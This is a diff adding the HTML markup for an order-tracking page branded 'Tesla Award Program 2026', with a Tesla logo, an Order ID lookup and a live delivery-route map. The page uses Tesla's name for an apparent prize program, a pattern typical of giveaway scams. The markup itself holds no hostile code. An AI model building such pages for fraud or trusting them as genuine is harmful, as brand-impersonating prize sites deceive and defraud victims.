@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Track Your Order | Tesla Award Program 2026</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+  <link rel="stylesheet" href="css/style.css">
+  <style>
+    body{background:var(--light);}
+    .track-wrap{max-width:860px;margin:0 auto;padding:88px 24px 64px;}
+
+    /* Lookup card */
+    .lookup-card{background:white;border-radius:24px;box-shadow:0 20px 60px rgba(0,0,0,.1);padding:52px 48px;text-align:center;max-width:540px;margin:0 auto;}
+    @media(max-width:560px){.lookup-card{padding:32px 20px;border-radius:18px;}}
+    .lookup-icon{font-size:56px;margin-bottom:20px;}
+    .lookup-title{font-size:26px;font-weight:800;color:var(--dark);margin-bottom:8px;}
+    .lookup-sub{font-size:15px;color:var(--gray-2);line-height:1.65;margin-bottom:32px;}
+    .lookup-input-wrap{display:flex;gap:12px;margin-bottom:16px;}
+    .lookup-input-wrap .form-input{flex:1;}
+    @media(max-width:480px){.lookup-input-wrap{flex-direction:column;}}
+    .lookup-hint{font-size:12px;color:var(--gray-2);text-align:left;}
+
+    /* Tracking view */
+    .track-header{background:white;border-radius:20px;border:1.5px solid rgba(0,0,0,.06);box-shadow:var(--shadow);padding:28px 32px;margin-bottom:20px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:16px;}
+    .track-id-group{display:flex;flex-direction:column;gap:4px;}
+    .track-id-label{font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--gray-2);}
+    .track-id-val{font-size:20px;font-weight:800;color:var(--dark);font-family:monospace;}
+    .track-status-chip{display:inline-flex;align-items:center;gap:8px;background:rgba(0,165,80,.08);border:1px solid rgba(0,165,80,.2);border-radius:999px;padding:8px 18px;font-size:14px;font-weight:700;color:#00A550;}
+    .status-dot{width:8px;height:8px;border-radius:50%;background:#00A550;animation:pulse 1.5s ease-in-out infinite;}
+
+    /* Content grid */
+    .content-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:20px;}
+    @media(max-width:700px){.content-grid{grid-template-columns:1fr;}}
+    .track-card{background:white;border-radius:18px;border:1.5px solid rgba(0,0,0,.06);box-shadow:var(--shadow);padding:24px;}
+    .track-card-title{font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--gray-2);margin-bottom:16px;}
+
+    /* Detail rows */
+    .det-row{display:flex;justify-content:space-between;align-items:flex-start;padding:7px 0;font-size:14px;}
+    .det-row:not(:last-child){border-bottom:1px solid rgba(0,0,0,.05);}
+    .det-key{color:var(--gray-2);}
+    .det-val{color:var(--dark);font-weight:600;text-align:right;max-width:60%;font-size:13px;}
+
+    /* Progress */
+    .progress-card{background:white;border-radius:18px;border:1.5px solid rgba(0,0,0,.06);box-shadow:var(--shadow);padding:24px;margin-bottom:20px;}
+    .prog-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;font-size:14px;}
+    .prog-pct{font-size:22px;font-weight:800;color:#E31937;}
+
+    /* Map */
+    .map-card{background:white;border-radius:18px;border:1.5px solid rgba(0,0,0,.06);box-shadow:var(--shadow);padding:24px;margin-bottom:20px;}
+    #trackMap{height:340px;border-radius:14px;overflow:hidden;}
+    @media(max-width:560px){#trackMap{height:240px;}}
+  </style>
+  <link rel="icon" type="image/svg+xml" href="assets/tesla-award-logo.svg">
+</head>
+<body>
+
+<nav class="nav">
+  <div class="nav-inner">
+    <a href="index.html" class="nav-logo">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="var(--red)"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3l7 4v2h-3v6h-2v-6H8V9H5l7-4z"/></svg>
+      TESLA
+    </a>
+    <a href="index.html" class="btn btn-ghost" style="font-size:14px;">← Home</a>
+  </div>
+</nav>
+
+<div class="track-wrap">
+
+  <!-- LOOKUP -->
+  <div id="lookupSection" class="anim-fade-up">
+    <div class="lookup-card">
+      <div class="lookup-icon">📍</div>
+      <h1 class="lookup-title">Track Your Tesla</h1>
+      <p class="lookup-sub">Enter your Order ID or Tracking Number to see the real-time status and location of your Tesla delivery.</p>
+      <div class="lookup-input-wrap">
+        <input class="form-input" type="text" id="trackInput" placeholder="Order ID (TSLA-XXXXXX) or Tracking # (TRK-XXXX)">
+        <button class="btn btn-primary" onclick="lookupOrder()" style="white-space:nowrap;">Track →</button>
+      </div>
+      <p class="lookup-hint">💡 Your Order ID and Tracking Number were emailed to you and are also shown on your order confirmation page.</p>
+    </div>
+  </div>
+
+  <!-- TRACKING RESULTS (hidden initially) -->
+  <div id="trackingSection" style="display:none;">
+
+    <!-- Header -->
+    <div class="track-header anim-fade-up">
+      <div>
+        <div class="track-id-label">Order ID</div>
+        <div class="track-id-val" id="orderIdDisplay">—</div>
+      </div>
+      <div>
+        <div class="track-id-label">Tracking Number</div>
+        <div class="track-id-val" style="color:#E31937;" id="trackingDisplay">—</div>
+      </div>
+      <div>
+        <div class="track-status-chip"><span class="status-dot"></span><span id="statusChip">Confirmed</span></div>
+      </div>
+      <button class="btn btn-ghost" onclick="resetLookup()" style="font-size:13px;">Search Again</button>
+    </div>
+
+    <!-- Progress -->
+    <div class="progress-card anim-fade-up delay-1">
+      <div class="prog-header">
+        <div class="track-card-title" style="margin:0;">Delivery Progress</div>
+        <div class="prog-pct" id="progressPct">0%</div>
+      </div>
+      <div class="progress-bar" style="height:10px;margin-bottom:20px;"><div class="progress-fill" id="progressFill" style="width:0%;"></div></div>
+      <div class="timeline" id="timeline"></div>
+    </div>
+
+    <!-- Details grid -->
+    <div class="content-grid">
+      <div class="track-card anim-fade-up delay-2">
+        <div class="track-card-title">Vehicle & Order</div>
+        <div id="vehicleDetails"></div>
+      </div>
+      <div class="track-card anim-fade-up delay-3">
+        <div class="track-card-title">Delivery Address</div>
+        <div id="addressDetails"></div>
+      </div>
+    </div>
+
+    <!-- Map -->
+    <div class="map-card anim-fade-up delay-4">
+      <div class="track-card-title">🗺️ Live Delivery Route</div>
+      <div id="trackMap"></div>
+      <div style="margin-top:12px;display:flex;gap:16px;flex-wrap:wrap;font-size:13px;color:var(--gray-2);">
+        <span style="display:flex;align-items:center;gap:6px;"><span style="width:10px;height:10px;background:#E31937;border-radius:50%;"></span> Origin: Tesla Factory, Fremont CA</span>
+        <span style="display:flex;align-items:center;gap:6px;"><span style="width:10px;height:10px;background:#00A550;border-radius:50%;"></span> Your Delivery Address</span>
+        <span style="display:flex;align-items:center;gap:6px;"><span style="font-size:14px;">🚚</span> Your Tesla in Transit</span>
+      </div>
+    </div>
+
+    <div style="display:flex;gap:14px;flex-wrap:wrap;" class="anim-fade-up delay-5">
+      <a href="index.html" class="btn btn-outline" style="flex:1;text-align:center;">← Back to Home</a>
+      <button onclick="window.location.reload()" class="btn btn-primary" style="flex:1;">↻ Refresh Status</button>
+    </div>
+  </div>
+</div>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script src="js/config.js"></script>
+<script src="js/app.js"></script>
+<script src="js/track.js"></script>
+</body>
+</html>
